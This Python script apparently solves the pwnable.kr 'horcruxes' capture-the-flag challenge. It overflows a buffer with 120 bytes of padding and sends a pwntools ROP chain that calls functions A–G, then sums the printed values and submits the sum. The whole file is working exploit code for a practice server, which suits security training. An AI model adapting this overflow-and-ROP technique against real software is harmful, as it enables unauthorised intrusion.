import re
import socket
import time

from pwn import ROP, context

context.log_level = False


BUFFER_SIZE = 4096
CHALLENGE_ADDRESS = ('pwnable.kr', 9032)
BINARY_PATH = 'horcruxes'
BINARY_FUNCTIONS = ['A', 'B', 'C', 'D', 'E', 'F', 'G']
LAST_ROP_ADDRESS = 0x809fffc


def get_exp_sum(output: str) -> int:
    """
    Get the sum from the textual output of the binary
    """
    exp_sum = 0
    number_regex = re.compile(r'\(EXP \+(?P<number>[\-\d]*)\)')

    for line in output.splitlines():
        match = number_regex.search(line)
        if match:
            exp_sum += int(number_regex.search(line).group('number'))

    return exp_sum


def build_payload() -> bytes:
    rop = ROP(BINARY_PATH)

    for binary_function in BINARY_FUNCTIONS:
        rop.call(binary_function)

    rop.raw(LAST_ROP_ADDRESS)

    payload = b'4\n'
    payload += b'A' * 120
    payload += bytes(rop) + b'\n'

    return payload


def main() -> None:
    conn = socket.socket()
    conn.connect(CHALLENGE_ADDRESS)

    print(conn.recv(BUFFER_SIZE).decode())
    time.sleep(2)

    conn.send(build_payload())
    time.sleep(2)
    exp_stage_output = conn.recv(BUFFER_SIZE).decode()
    time.sleep(2)

    print(exp_stage_output)
    exp_sum = get_exp_sum(exp_stage_output)
    print(f'Calculated sum is: {exp_sum}')

    conn.send(b'4\n')
    time.sleep(2)

    answer = str(exp_sum).encode()
    print(answer)
    conn.send(answer + b'\n')
    time.sleep(2)

    print(conn.recv(BUFFER_SIZE).decode())
    print(conn.recv(BUFFER_SIZE).decode())
    conn.close()


if __name__ == '__main__':
    main()
